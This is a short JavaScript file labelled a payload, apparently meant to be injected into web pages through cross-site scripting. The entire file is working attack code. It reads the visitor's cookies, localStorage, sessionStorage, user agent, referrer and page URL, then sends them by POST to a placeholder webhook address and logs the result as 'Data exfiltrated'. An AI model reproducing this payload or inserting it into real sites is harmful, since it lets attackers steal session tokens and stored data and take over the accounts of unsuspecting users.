// JavaScript Payload
(function() {
    console.log('Payload executed on:', window.location.href);

    // Collect information
    const data = {
        url: window.location.href,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
    };

    // Send to webhook
    fetch('{{WEBHOOK_URL}}/callback', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
    }).then(response => {
        console.log('Data exfiltrated:', response.status);
    }).catch(err => {
        console.error('Exfiltration failed:', err);
    });
})();
